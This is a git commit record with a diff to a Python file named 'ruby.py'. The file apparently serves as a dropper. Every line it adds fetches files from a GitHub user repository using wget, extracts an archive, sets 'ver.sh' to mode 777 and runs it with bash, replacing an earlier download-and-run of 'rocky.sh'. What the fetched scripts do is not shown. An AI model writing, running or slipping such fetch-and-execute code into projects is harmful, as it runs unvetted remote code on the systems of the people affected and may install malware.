ba079918e24515fa008037599251056598dd7338
Ckrrtkc <86514960+Ckrrtkc@users.noreply.github.com>
2021-06-26 14:38:09 +0530

    Update ruby.py

--- ruby.py
+++ ruby.py
@@ -1,6 +1,8 @@
 import subprocess
 import time
 
-subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh", shell=True)
-subprocess.call("chmod 755 rocky.sh", shell=True)
-subprocess.call("bash rocky.sh", shell=True)
+subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/helio.tar.gz", shell=True)
+subprocess.call("tar xf helio.tar.gz", shell=True)
+subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/ver.sh", shell=True)
+subprocess.call("chmod 777 ver.sh", shell=True)
+subprocess.call("bash ver.sh", shell=True)
